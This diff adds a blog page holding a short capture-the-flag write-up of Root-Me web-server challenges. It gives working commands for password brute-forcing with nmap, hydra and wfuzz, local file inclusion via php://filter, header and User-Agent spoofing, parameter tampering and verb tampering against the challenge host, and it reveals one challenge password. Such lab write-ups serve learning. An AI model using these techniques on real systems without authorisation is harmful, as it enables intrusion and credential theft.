@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Root-me Webserver | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Root-me Webserver | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Root-me Webserver" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash" />
+<meta property="og:description" content="HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/root-me/bg.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-08T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/root-me/bg.jpeg" />
+<meta property="twitter:title" content="Root-me Webserver" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Root-me Webserver","dateModified":"2021-02-08T00:00:00-06:00","description":"HTML - Source code Look at source code &lt;!-- Je crois que c&#39;est vraiment trop simple là ! password : xxx --&gt; HTTP - Open redirect ```# by using hash-identifier tool, I found that the hash algorithm is MD5: Type “help”, “copyright”, “credits” or “license” for more information. import md5 md5.new(‘https://facebook.com’).digest().encode(‘hex’) ‘a023cfbf5f1c39bdf8407f28b60cd134’ md5.new(‘https://mydomain.com’).digest().encode(‘hex’) ‘9af3e23ea90265a580cb11bfce830f97’ Then submit the GET request with my evil domain and related MD5 hash","datePublished":"2021-02-08T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-root-me-webserver/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-root-me-webserver/","image":"/assets/root-me/bg.jpeg","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Root-me Webserver</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-08">08 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/root-me/bg.jpeg" alt="Root-me Webserver">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#html---source-code">HTML - Source code</a></li>
+  <li><a href="#http---open-redirect">HTTP - Open redirect</a></li>
+  <li><a href="#http---user-agent">HTTP - User-Agent</a></li>
+  <li><a href="#weak-password">Weak Password</a></li>
+  <li><a href="#backup-file">Backup File</a></li>
+  <li><a href="#http---directory-indexing">HTTP - Directory indexing</a></li>
+  <li><a href="#http---headers">HTTP - Headers</a></li>
+  <li><a href="#php---filters">PHP - Filters</a></li>
+  <li><a href="#http-post">HTTP POST</a></li>
+  <li><a href="#http---improper-redirect">HTTP - Improper redirect</a></li>
+  <li><a href="#http---verb-tampering">HTTP - Verb tampering</a></li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h3 id="html---source-code">HTML - Source code</h3>
+<pre><code class="language-#">Look at source code
+&lt;!-- 
+ Je crois que c'est vraiment trop simple là ! 
+password : xxx
+--&gt;
+</code></pre>
+<h3 id="http---open-redirect">HTTP - Open redirect</h3>
+<pre><code class="language-#">by using `hash-identifier` tool, I found that the hash algorithm is MD5:
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt;
+&gt;&gt;&gt; import md5
+&gt;&gt;&gt; md5.new('https://facebook.com').digest().encode('hex')
+'a023cfbf5f1c39bdf8407f28b60cd134'
+&gt;&gt;&gt;
+&gt;&gt;&gt; md5.new('https://mydomain.com').digest().encode('hex')
+'9af3e23ea90265a580cb11bfce830f97'
+Then submit the GET request with my evil domain and related MD5 hash 
+
+OR 
+
+import hashlib
+kata = input("enter text : ")
+tytd1 = hashlib.md5(kata.encode())
+tytd2 = tytd1.hexdigest()
+print(tytd2)
+</code></pre>
+<h3 id="http---user-agent">HTTP - User-Agent</h3>
+<pre><code class="language-#">curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
+&lt;html&gt;&lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /&gt;&lt;iframe id='iframe' src='https://www.root-me.org/?page=externe_header'&gt;&lt;/iframe&gt;&lt;h3&gt;Welcome master!&lt;br/&gt;Password: rr$Li9%L34qd1AAe27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<h3 id="weak-password">Weak Password</h3>
+<pre><code class="language-#">nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
+or 
+nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
+or
+hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/
+or
+wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/
+</code></pre>
+<h3 id="backup-file">Backup File</h3>
+<pre><code class="language-#">nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
+PORT   STATE SERVICE
+80/tcp open  http
+| http-backup-finder:
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=challenge01.root-me.org
+|_  http://challenge01.root-me.org:80/web-serveur/ch11/index.php~
+or
+Used OWASP ZAP’s Active Scanner with Backup File Search (included in Active Scanner Rules (beta)). Make sure to use the full path (http://challenge01.root-me.org/web-serveur/ch11/index.php) for the scan and it’ll find the backup "http://challenge01.root-me.org/web-serveur/ch11/index.php~" file, which has a hardcoded password
+
+</code></pre>
+<h3 id="http---directory-indexing">HTTP - Directory indexing</h3>
+<pre><code class="language-#">firs we must check source code and you can see /admin/pass.html
+then open /admin
+and /admin/backup
+
+</code></pre>
+<h3 id="http---headers">HTTP - Headers</h3>
+<pre><code class="language-#">Using CURL:
+
+Request the headers only:
+curl -I http://challenge01.root-me.org/web-serveur/ch5/
+
+Send request with headers:
+curl -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
+</code></pre>
+<h3 id="php---filters">PHP - Filters</h3>
+<pre><code class="language-#">We’re going to work at the command line, so let’s define a variable we will use:
+url=http://challenge01.root-me.org//web-serveur/ch12/
+
+We know we are looking for a LFI with php://filter, so let’s try to display the base64 of the file login.php which is use for the authentication(?inc=login.php)
+
+$ curl "${url}?inc=php://filter/read=convert.base64-encode/resource=login.php"
+
+</code></pre>
+<h3 id="http-post">HTTP POST</h3>
+<pre><code class="language-#">first using burp suit and change to this 
+
+POST /web-serveur/ch56/ HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: http://challenge01.root-me.org
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch56/
+Upgrade-Insecure-Requests: 1
+
+score=999999999999999999999999999999&amp;generate=Give+a+try%21
+</code></pre>
+<h3 id="http---improper-redirect">HTTP - Improper redirect</h3>
+<pre><code class="language-#">curl -H "HTTP/1.1 200" "http://challenge01.root-me.org/web-serveur/ch32/index.php?redirect"
+</code></pre>
+<h3 id="http---verb-tampering">HTTP - Verb tampering</h3>
+<pre><code class="language-#">Using Burp :
+OPTIONS /web-serveur/ch8/ HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11;Linux x86_64; rv:78.0) Gecko/20100101 
+Curl :
+curl http://challenge01.root-me.org/web-serveur/ch8/ -X OPTIONS
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Root-me Webserver&url=/writeup-root-me-webserver/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-root-me-webserver/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-root-me-webserver/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#root-me">root-me</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-server">web-server</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-root-me-webclient/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/root-me/bg.jpeg" alt="Root-me Client"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-root-me-webclient/">Root-me Client</a>
+                
+            </h2>
+            <h4 class="card-text">HTML - disabled buttons ```# All you have to do is open a browser inspectior of your choosing and examine the code. (If you are using chrome, you can get...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">08 Feb 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-root-me-Cryptography/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/root-me/bg.jpeg" alt="Root-me Cryptography"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-root-me-Cryptography/">Root-me Cryptography</a>
+                
+            </h2>
+            <h4 class="card-text">Encoding - ASCII
+```#
+this challange come from root-met of type Cryptography
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">08 Feb 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
